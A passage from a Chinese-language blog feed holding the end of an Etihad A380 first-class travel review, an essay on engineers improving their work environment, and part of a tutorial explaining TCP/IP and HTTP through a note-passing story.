src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__Gu9BQaVHgIjnwYem.jpg"></p><p>最後去按摩一下，頭等艙有贈送免費 15 分鐘的按摩。</p><p>弄完以後時間也差不多了就去登機了，全世界唯二兩台洗澡機好像是阿聯酋跟阿提哈德的 A380，這個飛機有兩層，商務頭等一層，經濟艙一層，頭等好像有 9 個位子，是全部都坐滿的。</p><p>我在下飛機的時候有稍微觀察一下其他人，有兩個韓國人，其他幾個看起來比較像中東的應該是來做生意的，因為一下飛機就有合作夥伴來接他們。</p><p>先來看一下頭等艙長什麼樣子：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/1__Z6Qgs5v1I9Rqjna82znZLA.jpeg"><br><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/1__3D6Z__koYk9sWiyDOR0VbIA.jpeg"></p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__DP__ys__iVUKYB9Cll.jpg"></p><p>一上飛機之後就會有空服員來跟你問好然後自我介紹，接著就可以點晚餐，這是那天的菜單：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__hvJAUdMf0dOUkh9q.jpg"></p><p>我後來是點了 chicken breast，因為在貴賓室其實已經吃差不多飽了，只是想體驗看看而已。</p><p>酒的話我倒是完全不熟，就讓空服員推薦，最後搭了一支紅酒：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__WmTjALrOdjPnrY8G.jpg"></p><p>吃完之後就是請空服員來鋪床，然後我就問她可不可以洗澡，她說等她一下，要準備一些東西。大概等了十分鐘左右就跟我說可以去洗澡了，然後稍微跟我介紹一下怎麼用。</p><p>淋浴的空間不大但也沒有到很小，跟我之前去日本住的 hostel 的淋浴空間差不多：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/1__Hkt8oD4rfunkeQtF2fk0Mg.jpeg"></p><p>右邊那個燈號是在提醒你熱水還剩多久，熱水只能供應五分鐘而已。淋浴該附的備品都有附，例如說洗髮精、潤髮乳、沐浴乳、乳液跟浴帽等等，也有吹風機可以讓你吹頭髮。</p><p>蓮蓬頭是在上面固定住的：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__b2__1cRelEBku0GTE.jpg"></p><p>總之在飛機上洗澡真的是個滿特別的體驗，不知道洗一洗如果碰到亂流會怎樣。</p><p>洗洗睡洗洗睡，洗完澡之後差不多就該睡了，床鋪其實滿大的：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/1__n9__FyjkGmQepSc2S2itGcg.jpeg"><br><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/1__VJZRRBaPAYKSww6HETDp5A.jpeg"></p><p>實際睡起來跟商務艙真的差滿多的，第一個差別是它一體成型，商務艙的是三塊合併在一起，有細節上的差異。第二個是寬度比較寬，再來是枕頭也比較厲害，好像是羽絨枕之類的。最後是高度，我 182 睡起來還有滿多空間，猜測 200 公分睡應該差不多會佔滿。</p><p>商務艙睡起來你會覺得在睡小一點的沙發之類的，但這個因為比較寬，所以真的有在睡床的感覺。</p><p>因為之前從 AUH 飛 CDG 也是阿提哈德 A380，但是是商務艙，所以剛好可以做個比較。以這一台飛機來說，頭等跟商務的會明顯感受到有差，差最多的就是可以洗澡以及有個單人床，吃的東西倒是沒有差太多。</p><p>我之前搭國泰頭等 bug 票香港到舊金山，頭等跟商務我就覺得區別不大，其實有點小失望：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__i5fTqQlsAyGqnULg.jpg"></p><p>最後簡單來做個總結。</p><p>阿提哈德的 A380 頭等艙叫做：First Apartment，我覺得真的是實至名歸，「住起來」滿舒服的，空間很大，而且有床可以睡真的很棒。</p><p>而且解開了空中洗澡的成就，讚讚讚。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工程師職涯隨意聊：改變環境，而不是讓環境改變你</title>
      <link href="/2019/10/11/change-43bb422a30ed/"/>
      <url>/2019/10/11/change-43bb422a30ed/</url>
      
        <content type="html"><![CDATA[<p>假設你今天是一個菜逼八工程師，你可能非本科轉職，也可能本科系畢業，但不管怎樣，總之就是很菜就對了。</p><p>而還很菜的你正在找尋第一或第二份工作，此時你會想進一間什麼公司？</p><blockquote><p>有一個完整的 team，大家互相合作，也有資深工程師能夠指點迷津或是指引方向。公司制度好、福利好，用很新的技術，做很酷的東西。不用相容 IE，不用維護 legacy code。</p></blockquote><p>相信答案應該跟上面滿相近的。</p><p>如果有許多人對這題的答案都差不多，就代表許多人都想進這類型的公司。</p><p>可是你有沒有想過，為什麼公司要收你？假設上面的「許多人」是一百人，但公司開的缺只能收一個人，那憑什麼你覺得那個人會是你？</p><p>你一定要是那一百人裡面最突出最強的，才會被選上。</p><p>而剩下的九十九人都沒辦法進去這類型的公司，沒辦法有這麼好的工作環境。</p><p>大家都想進好公司，擁有好的環境，這是事實。可是好的環境並沒有這麼多，這也是事實。而上面兩個事實加在一起，就得出另一個結論：</p><blockquote><p>大多數人沒辦法去到這麼好的工作環境。</p></blockquote><p>假設你就是那剩下的九十九人，在一個沒那麼好的工作環境，而且也沒辦法找到更好的，那該怎麼辦？</p><p>此時你有兩個選擇。第一個選擇是安於現況，覺得待在現在的環境就很好了，不需要到更好的環境，這也是一個選擇。</p><p>第二個選擇是提升能力，之後才能跳到更好的環境。</p><p>如果你能到更好的環境，你早就在了。若是你現在待的環境不夠好，很有可能就是你不夠強（或者是整個大環境都太糟）。</p><p>所以要變強，變成一百人當中最優異的那幾個。</p><p>那該怎麼變強？</p><p>第一，利用工作之外的時間提升自己的能力。</p><p>這個滿多人都知道的我就不另外講了，反正不外乎就是利用下班或是假日的時間繼續鍛鍊自己的技術之類的。</p><p>第二，試著把工作的環境變好，跟它一起成長。</p><p>有些人會忘記這個選項，以為環境是無法被改變的。我同意有些環境很難被改變，但這個我們留到最後再說。</p><p>這邊的環境我們先侷限在「技術上的工作環境」，畢竟現在談的是工程師。整體上的工作環境例如說公司制度、薪水、福利等等的不在這篇文章討論的範圍之內。</p><p>例如說公司沒有用版本控制，與其一直抱怨公司環境不好而不做任何事情，不如跟主管提議說想要引入 Git，也導入 GitHub workflow，每個改動都要提 PR，還可以順便導入 code review，讓幾個同事之間輪流負責。</p><p>不過想要改變環境，自然要提出為什麼要改變的理由，以上面的工作流程來講，我自己的理由會是：</p><ol><li>沒有版本控制的時候就不知道每個版本改了哪些程式碼，發生問題時很難 trace</li><li>Code review 能幫助大家提升 code quality，也能夠了解同事到底做了哪些改動，大家對專案的理解程度都會上升</li><li>GitHub workflow 讓大家有個明確的流程可以 follow，不會像以前雜亂無章，想改什麼就直接改</li></ol><p>或者說如果今天公司只有你一個人負責這整個專案，與其一直抱怨說：「一個人也不知道自己 code 寫得好不好，好想要有一個 team」然後不做任何改變，不如自己導入一些增進 code quality 的東西，例如說 ESLint，或是寫測試，不只寫 unit test，也寫 e2e test，來把這個專案變得更完整。</p><p>雖然導入這些之後，你還是不知道自己到底做得好不好，但至少基本的東西你嘗試過了，該做的你也都做了。當你未來真的進入一個完整的 team 的時候，就可以快速上手，迅速理解整個專案，並且學習到更好的流程以及寫法。</p><p>有些人會跟著環境一起沈淪。環境很差，所以我也不用太好，只要得過且過就好。如果是這樣子，那你只能永遠待在這種環境，因為你的能力沒有提升，所以下一份也不會找到什麼太好的環境。</p><p>但若是你試著去改變環境而且成功了，就可以跟環境一起成長，一起往更好的方向走。</p><p>最後，你可能會說：「你上面舉的例子都太低估環境了，環境哪有這麼容易改變？」</p><p>我覺得這得試試看才知道，你試過了嗎？我沒有要你直接「重建」整個環境，而是一步步慢慢來，一點一點變得更好。</p><p>如果你試過了，發現因為各種阻礙（例如說主管不允許、同事不配合、公司不支持等等）而無法改變的話…</p><p>那我會建議你直接離職，去找一個願意改變的環境。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從傳紙條輕鬆學習基本網路概念</title>
      <link href="/2019/09/26/learning-tcp-ip-http-via-sending-letter-5d3299203660/"/>
      <url>/2019/09/26/learning-tcp-ip-http-via-sending-letter-5d3299203660/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/0____Wl6dobqXN8IAcYf.jpg"></p><p>每當提到「網路概念」這幾個字，就會想起以前上計算機概論的時候，一大堆名詞排山倒海而來，OSI 七層網路模型、TCP&#x2F;IP 四層、三次握手…雖然說有個大概的感覺，但還是不知道那些理論到底在幹嘛。</p><p>一直到很後來，我看到一篇利用傳紙條來解釋 HTTPS 原理的<a href="https://www.jianshu.com/p/b894a7e1c779">文章</a>，才被打通任督二脈，並且察覺到利用「傳紙條」這個很生活化的例子，可以很好地去解釋 TCP&#x2F;IP、HTTP 或甚至是任何跟網路有關的東西。</p><p>希望透過這一系列的傳紙條小故事，可以讓大家理解什麼是 TCP&#x2F;IP，什麼又是 HTTP 協定，以及這些東西到底是為了什麼而誕生的。雖然說希望讀者沒有任何相關背景也能看懂，但其實比較適合已經大概知道什麼是 TCP&#x2F;IP 以及 HTTP 的讀者觀看，會比較容易知道這一篇到底在講什麼。</p><p>在開始之前，請大家先在腦中想起自己國高中教室的畫面，想起那些課桌椅，想起傳過的紙條，這樣會更融入這個情境，也對故事更有共鳴。</p><h3 id="第一集：告白篇"><a href="#第一集：告白篇" class="headerlink" title="第一集：告白篇"></a>第一集：告白篇</h3><p>故事的主角是小明跟小美，是一對青梅竹馬，念一樣的幼稚園、一樣的國小，也唸一樣的國中（甚至還同班），甚至連住處都只隔了一個樓梯間而已，就在隔壁。</p><p>喔對了，這是一個還沒有手機的年代。</p><p>雖然說一堂課大概 45 分鐘左右，也不會到很長，但有些話就是想立刻跟對方分享，一刻都等不及。因此，大家都會利用上課時間傳紙條來跟其他人對話（題外話，現在的國高中生是不是都不傳紙條了啊，傳 Line 就好）。</p><p>寫紙條是件非常簡單的事，只要隨意從筆記本上面撕一頁下來，寫完內容之後折一折，在封面寫上「To 小美」，然後把紙條丟給隔壁同學，同學們就會幫你把紙條傳到小美手上。</p><p>因為通常會傳紙條給小美的也就只有小明一個人而已，所以也不用寫是誰傳的，大家都知道一定是小明。</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__lTpjzS287__iivKMukgRNFA.png"></p><p>原本一切都進行得很順利，他們兩人之間的感情透過一張張的紙條不斷堆疊，越來越熟悉彼此，走得一天比一天近。而小明心中也慢慢浮現了一個想法：「好像差不多是時候告白，表示我的心意了」。</p><p>可是天不從人願，沒想到才過了幾天，小美就被轉到最遠的十班去了！原本同在一班的兩人就這樣分隔兩地。</p><p>小明不是個會輕言放棄的人，否則對不起自己，因此就買通一班到十班認識的同學，約定好互相幫忙跨班級傳紙條，只要在封面寫上是幾班的誰就好，就可以傳紙條到其他班級去。</p><p>除此之外，也要把寄件人寫清楚，才知道紙條回傳的時候要給誰。其實就跟寄信差不多啦，只要把收件人跟寄件人寫清楚，其他同學就會充當郵差的角色，幫你把紙條傳到對方手上。</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__3sg59xKavnoqScMbZOKUzw.png"></p><p>確認了紙條可以跨班級傳送之後，小明就決定要來告白了，於是傳了一張「我喜歡你！如果你願意答應我的告白，放學後操場榕樹下見」的老派紙條給小美，並且在放學後到榕樹下等著。</p><p>等呀等，等呀等，從下午四點等到晚上八點，小美始終沒有出現。</p><p>原本小明想繼續等的，但無奈老天爺都為他哭泣，天空抑制不了衝動，落下雨和眼淚，小明只好狼狽地走回家裡。這樣也好，就跟倒立淚水就不會流出來一樣，只要下雨，就分不清楚臉上的是雨水還是淚水了。</p><p>隔天到了學校，心灰意冷的小明發現一件奇怪的事情，那就是小美神色自若，好像什麼事情都沒發生一樣。</p><p>咦…該不會對她而言，真的什麼都沒發生吧？</p><p>於是小明在下課的時候鼓起勇氣去問了小美：「昨天…你怎麼沒有來」，沒想到小美一臉疑惑，說道：「什麼意思？」。就在這個瞬間，小明知道了一件事：「靠夭，原來我的紙條沒有傳到」。</p><h4 id="確保溝通的辦法"><a href="#確保溝通的辦法" class="headerlink" title="確保溝通的辦法"></a>確保溝通的辦法</h4><p>雙方的溝通如果想要順暢，說穿了就是要確保以下四點：</p><ol><li>發送方的傳送功能</li><li>發送方的接收功能</li><li>接收方的傳送功能</li><li>接收方的接收功能</li></ol><p>簡單來講就是雙方的傳送跟接收都必須要正常，否則就會發生遺漏訊息的狀況，例如說 A 發給 B，可是 B 的接收壞掉了，或者是 B 回傳給 A，可是 B 的訊息根本發不出去。</p><p>那要怎麼樣確保這四個功能都正常呢？可以透過三個打招呼的步驟來確認。以下直接用小明以及小美來舉例：</p><ol><li>小明傳給小美：安安，在嗎？</li><li>小美收到後回覆：在呀，你好</li><li>小明收到後回覆：收到，太好了</li></ol><p>如果這三個步驟都能夠順利進行，就代表彼此之間溝通的管道無礙。</p><p>不過有一點要注意，這邊先假設一旦某個功能確認正常以後就不會改變，例如說小明的發送功能如果確認正常，就不會突然失效。以傳紙條的例子來說，就是幫你傳紙條的同學不會無緣無故消失的意思。</p><p>那為什麼透過這三個步驟可以確認呢？我們一步一步來分析。</p><h4 id="第一步：小明傳送給小美：「安安，在嗎？」"><a href="#第一步：小明傳送給小美：「安安，在嗎？」" class="headerlink" title="第一步：小明傳送給小美：「安安，在嗎？」"></a>第一步：小明傳送給小美：「安安，在嗎？」</h4><p>如果小美沒收到這個訊息，那就代表小明的發送或者是小美的接收端有問題，所以就可以確認溝通管道是有問題的。</p><p>如果小美收到了這個訊息，從小美的角度來看，就知道兩件事：</p><ol><li>自己的接收功能是好的（否則收不到訊息）</li><li>小明的發送功能是好的（否則收不到訊息）</li></ol><h4 id="第二步：小美傳送給小明：「在呀，你好」"><a href="#第二步：小美傳送給小明：「在呀，你好」" class="headerlink" title="第二步：小美傳送給小明：「在呀，你好」"></a>第二步：小美傳送給小明：「在呀，你好」</h4><p>小明收到這個訊息以後，就可以知道四件事情：</p><ol><li>自己的發送功能是好的（因為小美一定有收到之前傳的「安安，在嗎」，才會回傳這個訊息）</li><li>自己的接收功能是好的（不然收不到訊息）</li><li>小美的發送功能是好的（不然收不到訊息）</li><li>小美的接收功能是好的（因為小美有收到之前傳過去的訊息）</li></ol><p>所以對小明來說，已經可以知道雙方的溝通管道是沒問題的了。但是對小美來說她還不知道啊，所以還需要最後一個步驟。</p><h4 id="第三步：小明傳給小美：「收到，太好了」"><a href="#第三步：小明傳給小美：「收到，太好了」" class="headerlink" title="第三步：小明傳給小美：「收到，太好了」"></a>第三步：小明傳給小美：「收到，太好了」</h4><p>小美收到訊息以後，就又知道兩件事情：</p><ol><li>自己的發送功能是好的（因為前一句有發出去，小明才會回這個訊息）</li><li>小明的接收功能是好的（因為前一句小明有收到）</li></ol><p>或者也可以參考底下的動圖，代表的是「在接收到訊息時，可以確認的自己的部分」：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/0__nj7oJaWNUZzDSKD0.gif"></p><p>從以上的推論可以知道，如果這三個步驟都正常地進行，就代表這兩人之間的溝通管道是沒有問題的，傳紙條都不會被漏掉。</p><p>有了這一個確認溝通的機制之後，小明鼓起勇氣再一次的告白，而這次終於在榕樹下等到小美了 🎉</p><h4 id="傳紙條守則"><a href="#傳紙條守則" class="headerlink" title="傳紙條守則"></a>傳紙條守則</h4><p>從以上的故事當中，可以得知三個傳紙條守則：</p><ol><li>寫明來源</li><li>寫明目的地</li><li>經過三次的前置作業，確保雙方都能收發</li></ol><p>其實可以把傳紙條這件事情「分層」來看，意思就是把傳紙條分成不同的層級，每一層都只專注於傳紙條的其中一個面向：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__58hXSwsixNDxVkbbFKJ__Cg.png"></p><p>最底下一層就是傳紙條，指的就是「傳遞紙條」這個實體的動作，可是如果只有這層的話，你怎麼知道要把紙條傳給誰？所以中間那層是加上收發地址，才能知道要傳給誰嘛。</p><p>有了底下兩層，已經可以傳紙條給任何人了，但沒辦法保證收發是正常的。所以最上面那層代表的是「如何傳送資料」，意思是說你可以使用我們上面提到的機制（三個步驟）來傳紙條，就能夠確保收發正常，但你不想要也可以。</p><h4 id="第一集故事中所對應到的網路概念"><a href="#第一集故事中所對應到的網路概念" class="headerlink" title="第一集故事中所對應到的網路概念"></a>第一集故事中所對應到的網路概念</h4><p>為什麼會用傳紙條來比喻網路？因為這兩者的本質是一樣的，都是「資訊的傳遞」。而故事中的紙條其實就是網路世界的「封包」，承載著要傳遞的資訊。</p><p>既然兩者是類似的，我們就可以從上面傳紙條的守則跟分層當中推導出網路的模型，先從傳紙條守則開始：</p><ol><li>寫明來源，在網路世界中其實就是大家常聽到的 IP 位置</li><li>寫明目的地，同上</li><li>經過三次的前置作業，確保雙方都能收發。這個在網路裡是一個叫做「TCP 三次握手」的東西，TCP（Transmission Control Protocol）是一個通訊協定（Protocol），能夠保證雙方收發正常。</li></ol><p>通訊協定是甚麼？簡單來說就是一些制定好的規則。</p><p>以傳紙條的例子來說，你可以隨意傳，但不能保證對方一定收得到。而為了不讓小明的悲劇重演，我們發明了一個通訊協定叫做《紙條保證傳得到通訊協定》，只要你符合這個協定裡面制定的規則，就能保證紙條的傳遞。</p><p>而這個規則就是我們前面所提到的三次前置作業。</p><p>所以在傳紙條的時候，你可以選擇亂傳但對方不一定接收的到，也可以選擇遵守《紙條保證傳得到通訊協定》，確保對方一定收得到。</p><p>網路也是一樣的，TCP 是一個保證你的封包可以被對方接收到的協定，確保雙方溝通無礙。那要符合什麼規則呢？就是我們前面所提到的三次前置作業，而專有名詞叫做 TCP 三次握手（Three-way handshake）。</p><p>會透過三次握手來確保雙方都收發功能都正常，才會開始進行後續的資料交換。</p><h4 id="網路的分層"><a href="#網路的分層" class="headerlink" title="網路的分層"></a>網路的分層</h4><p>上面提到的紙條分層圖表裡面，可以對應到網路的分層：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__YS77c__xPvuOdWpiJ0bS0oQ.png"></p><p>以網路來說，最底下一層就是實際傳遞資料，例如說路由器或是海底電纜，是在真實世界傳遞訊號的方式。而收發地址這一層前面不是說過了，是透過 IP 位置嗎？雖然大家常常會簡稱為 IP，例如說查 IP 之類的，但 IP 的全名其實是：Internet Protocol，就是我們前面所提到的「協定」。</p><p>在這個協定裡面，有一個東西叫做 IP Address，就是你在網路上的地址。所以加上收發地址的這一層，對應到的網路通訊協定就是 IP。</p><p>而「如何傳送資料」那邊，對應到的是 TCP 通訊協定，只要你採用這個協定，就可以保證雙方收發正常。</p><h4 id="第一集小結"><a href="#第一集小結" class="headerlink" title="第一集小結"></a>第一集小結</h4><p>在第一集裡面，我們用了傳紙條當作生活化的範例，主要是想讓大家知道「傳紙條就跟網路傳封包沒兩樣」，想讓大家把這兩個東西對應起來，在思考網路概念時就會比較有畫面。</p><p>而我們也把傳紙條與網路進行了「分層」，分層的好處就是可以很明確看到每一層關注的東西都不同，所以只要處理跟那一層有關的事情就好了。</p><p>而第一集最後，我們導入了《紙條保證傳得到通訊協定》（TCP），來確保收發正常。能夠確保傳輸正常以後，就有了更多傳紙條的應用出現。</p><h3 id="第二集：便當篇"><a href="#第二集：便當篇" class="headerlink" title="第二集：便當篇"></a>第二集：便當篇</h3><p>小明跟小美的故事傳遍了整個校園，大家都知道了傳紙條的威力，紛紛透過類似的方法傳紙條給自己心儀的對象，想要效法他們兩個。</p><p>在校園當中，有個食量很大的同學千千卻看到了傳紙條的潛力，認為傳紙條不應該只是談情說愛的工具，它可以做到的事情還多著呢。</p><p>例如說：訂便當。</p><p>千千在校園中開啟了代訂便當的服務，只要傳紙條給她並說明要訂什麼便當，千千就會回傳訂便當是否成功以及價錢，從中收取 5~10 元不等的手續費：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__ouGIWwWe9257sLz5KSW3JA.png"></p><p>順帶一提，千千的代訂便當服務是有遵守《紙條保證傳得到通訊協定》的，否則訊息漏掉就糟糕了，就會發生有同學以為自己有訂但其實沒訂到的這種狀況。</p><p>在那個還沒有空腹熊貓的年代，代訂便當服務在校園中快速竄紅，吃膩學校營養午餐的人都透過千千來幫忙代訂便當，而千千也從中賺到不少零用錢。</p><p>但隨著使用人數愈來愈多，千千發覺到了一些問題。</p><h4 id="問題一：數字格式不統一"><a href="#問題一：數字格式不統一" class="headerlink" title="問題一：數字格式不統一"></a>問題一：數字格式不統一</h4><p>明明就是訂便當這麼簡單的一件事，卻有一些人很喜歡用不同的數字格式，不寫「一個排骨飯」而是寫「乙個排骨飯」，還有人是晶晶體的愛好者，寫「two 個雞腿飯」，千千只好無奈地以其人之道還治其人之身，回了個「你在公 three 小？」</p><p>這些格式的問題讓千千很困擾，因為她必須每一張紙條都很仔細看，才能看出對方到底要幾個便當。為了改善這個問題，千千決定統一格式，紙條一律都要長得像：</p><blockquote><p><em>排骨飯 2<br>雞排飯 3<br>雞腿飯 5</em></p></blockquote><p>這種格式，就是「品項 數量」，這樣子千千就能夠一目了然，迅速知道同學們到底想要什麼。</p><h4 id="問題二：特殊需求"><a href="#問題二：特殊需求" class="headerlink" title="問題二：特殊需求"></a>問題二：特殊需求</h4><p>雖然說統一了品項的格式，但有時候同學會有些特殊需求，也是讓千千很苦惱的問題，例如說：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__oCfmtydxFsAVGd9Y4ZStkw.png"></p><p>上面的紙條就寫明了要在第四堂送到，並且要加辣。而每個不同的同學都會有各自的特殊需求，這方面一定也要統一格式才行。</p><p>於是千千決定把紙條分成兩部分，上半部跟下半部，上半部就叫做 header，下半部叫做 body，靈感來自於人類的頭跟身體。header 的部分放特殊需求，而且要符合一定格式；body 的部分則放真正的訂單內容，如下圖所示：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1____2r1gWUPrjHZU8uaER2ZfQ.png"></p><p>如此一來，千千就可以很快地掌握這張紙條想要表達的意涵。</p><h4 id="問題三：回覆格式"><a href="#問題三：回覆格式" class="headerlink" title="問題三：回覆格式"></a>問題三：回覆格式</h4><p>對於每一張紙條，千千在收到之後都要做後續處理並且回覆。</p><p>例如說當排骨飯賣完了，就會回說：「排骨賣完了，換一個吧」；或是如果有同學字寫太醜導致千千看不懂，就會回說：「第三行字太醜看不懂」，有時候訂單一多，千千也會挑客人，不接邊緣人的訂單，因為數量太少了沒賺頭，會回說：「一個便當太少了，我不接」。</p><p>經過一段時間以後，千千意識到一件事情，那就是會發生的狀況其實都差不多，可能就那五六種而已，但以現在的情形來說，每次都要寫一樣的字，實在是很麻煩的一件事情。</p><p>這時候千千有了一個 idea，何不把這些情況變成數字呢？提供大家一張數字代碼對照表，例如說 200 對應到「訂購成功」，這樣只要在紙條上面寫 200，對方就知道有成功了，就可以少寫一大堆字！</p><p>於是千千把狀況歸類成這六個，並且把這個回傳代碼對照表發給所有同學：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__kZtVWgMNrshF0ydz9POfkg.png"></p><p>可是還有一個問題，代碼歸代碼，但有時候除了這些制式化的代碼以外，還要寫一些解釋才行。例如說「400 你紙條內容有錯，我看不懂」，還要明確指出是哪一行有錯，不然對方也不知道怎麼修正。</p><p>於是千千也把自己的回覆分成了 header 與 body 兩個部分，利用 header 傳這個代碼，必要時則在 body 說明附加訊息，會長的像這樣：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__biRpAcXnfuc0kl7VgUM__NQ.png"></p><p>如此一來，也成功地解決了問題，大部分情形都只要回傳一個數字，不用跟之前一樣寫那麼多字了，真是可喜可賀。</p><h4 id="問題四：動作不統一"><a href="#問題四：動作不統一" class="headerlink" title="問題四：動作不統一"></a>問題四：動作不統一</h4><p>這是最後一個問題了，就是動作不統一。</p><p>什麼是動作不統一呢？除了訂便當以外，還有可能會修改訂單啊！例如說有同學突然想翹課去打咖，就要跟千千說要少訂一份便當，否則多一份很不方便。或者是原本有同學訂了排骨飯，看了雞排妹的影片之後突然很想吃雞排，想改成雞排飯。</p><p>這一些東西也應該統一才對，不然對千千來說太累了。</p><p>於是千千決定在紙條的 header 加一個欄位，大家可以放四種動詞之一：</p><ol><li>GET 取得訂單資訊</li><li>POST 訂便當</li><li>DELETE 取消訂單</li><li>PUT 修改訂單</li></ol><p>例如說想要訂便當，就是傳這樣一個紙條：</p><blockquote><p>POST<br>送達時間：第四堂</p></blockquote><blockquote><p>雞腿飯 5<br>雞排飯 2</p></blockquote><p>若是想要取消訂單，就是這樣：</p><blockquote><p>DELETE</p></blockquote><blockquote><p>雞腿飯</p></blockquote><p>這樣千千就能很明確地看出這張紙條到底是想要幹嘛了。</p><p>千千的專長之一就是發現問題並且解決它，運用自己的頭腦解決了上面四個棘手的問題，把代訂便當的事業做得愈來愈大。</p><h4 id="第二集所對應到的網路概念"><a href="#第二集所對應到的網路概念" class="headerlink" title="第二集所對應到的網路概念"></a>第二集所對應到的網路概念</h4><p>從第二集訂便當服務的發展過程當中，我們可以很清楚地知道一件事情。</p><blockquote><p>想要規模化，就要標準化</p></blockquote><p>當你今天只在一個 30 人的班級裡面經營代訂便當服務時，哪來這麼多規則要管？反正人很少，你自己每張紙條都慢慢解讀就好，也花不多少時間。</p><p>可是，當千千想把事業擴張到全校 30000 名同學時（人還是不多就是了，畢竟只有狠愛演工作團隊的一半），就必須先把自己的工作流程標準化，因為這是規模化的前置作業。若是沒有標準化，解讀一張紙條可能要花 10 秒，但如果標準化了，可能只要 1 秒，效率是十倍。</p><p>這就是為什麼千千要透過不斷地制定規則去約束紙條的內容，因為這樣可以讓解讀紙條這件事變得更快更容易，千千才能處理更多的訂單。</p><p>在網路世界也是如此，為什麼要有 Protocol？為什麼要有這些規範？因為網路的封包都是由電腦來解讀的，它跟人腦最大的差別在於它是死的。</p><p>例如說「一個便當」、「乙個便當」、「one 個 bento」，對人類來說很輕易能夠看得懂這三個是在指涉同一個東西，但是對電腦來說，只是三個不同的「字串」，是三個不同的詞，它沒辦法知道這三個其實是一樣的。</p><p>所以必須制定一套標準，例如說「便當 1」這樣的格式，讓輸入全都符合這一套格式，電腦就只要去解析這一個單一格式就好。</p><p>開頭有提到說這個訂便當的服務是建立在《紙條保證傳得到通訊協定》之上，其實除了訂便當以外，還能發展出更多的服務，例如說訂飲料之類的，這些說穿了其實都是「如何應用傳紙條」來建立更多服務。</p><p>而這一段故事裡所提到的「訂便當服務」，對應到網路中其實就是我們最常看到的 HTTP（<a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">Hypertext Transfer Protocol</a>）：</p><p><img src="/img/learning-tcp-ip-http-via-sending-letter-5d3299203660/1__JeiVo68Vy9mtTNjrqPBdbw.png"></p><p>這邊會是我們傳紙條模型的最上層，因為確認如何傳送資料以後，就可以發展出更多實際應用。例如說「用紙條談情說愛」是一種傳紙條的應用，「用紙條訂便當」也是，你想拿來做什麼就可以做什麼。</p><p>在前面的故事中，我們可以得出底下的傳紙條守則：</p><ol><li>標準化內容格式</li><li>分為 header 跟 body</li><li>用狀態碼標準化結果</li><li>用動詞標準化動作</li></ol><p>而這四個其實就是 HTTP 通訊協定的內容。</p><p>在這邊簡單介紹一下 HTTP，例如說你透過瀏覽器輸入 <a href="http://google.com/">http://google.com</a> 並按下 Enter 之後，其實背後就是發了一個：</p><blockquote><p>GET（用動詞標準化動作）</p></blockquote><blockquote><p><a href="http://google.com/">http://google.com</a></p></blockquote><p>的紙條出去</p><p>而 Google 的 Server 在收到這張紙條並處理過後，就會把畫面傳回來，回傳的格式其實就跟千千回傳的格式差不多：</p><blockquote><p>Status: 200（用狀態碼標準化結果）</p></blockquote><blockquote><p><code>&lt;html&gt;…..&lt;/html&gt;</code>（分為 header 與 body）</p></blockquote><p>所以網頁運作背後其實是透過 HTTP 這個協定，也可以想成就是訂便當這個協定，只是把便當換成了網頁。（或是更廣義來說，把便當換成了「資源（resource）」）。</p><p>這樣你在學習 HTTP 這個通訊協定的時候，就不會對 Status code 感到陌生，它就只是傳紙條故事中的「用狀態碼標準化結果」而已；也不會覺得那些 HTTP method 很奇怪，那也只是故事中的「用動詞標準化動作」。</p><p>只要你能想起之前訂便當的故事，就能知道為什麼會有這些東西，以及這些東西到底在幹嘛。</p><h3 id="第三集：發大財篇"><a href="#第三集：發大財篇" class="headerlink" title="第三集：發大財篇"></a>第三集：發大財篇</h3><p>透過代訂便當服務，千千在學生時期就賺到了人生中的第一桶金。但千千的野心並沒有在此而止步，下一個階段，她想讓同班同學們一起發大財。</p><p>具體上應該怎麼做呢？</p><p>就是發展不同的業務，並且讓每個同學都負責一個獨立的業務，才不會彼此互相干涉。舉例來說，A 同學負責代訂飲料服務，B 同學負責 NBA 即時戰況報導，C 同學負責借籃球等等。</p><p>但馬上就碰到一個問題，那就是紙條該傳給誰？</p><p>如果傳給 A 同學本人，那 A 同學請假怎麼辦？所以應該是傳到班級就好，並且標注需要的服務，例如說：</p><blockquote><p>From 一班雜魚<br>To 八班：<strong>訂飲料</strong></p></blockquote><blockquote><p>POST<br>送達時間：三點前</p></blockquote><blockquote><p>全糖珍珠奶茶 5<br>過氣的黃金比例翡翠檸檬 1</p></blockquote><p>在冒號後面接上需要的服務，八班的人自然就會把這個紙條傳給對應到的同學。</p><p>這些字寫久了手也是會痠的，於是同學們決定效法之前千千提出的「數字對照表」的概念，把這些服務也換成數字：</p><p><img 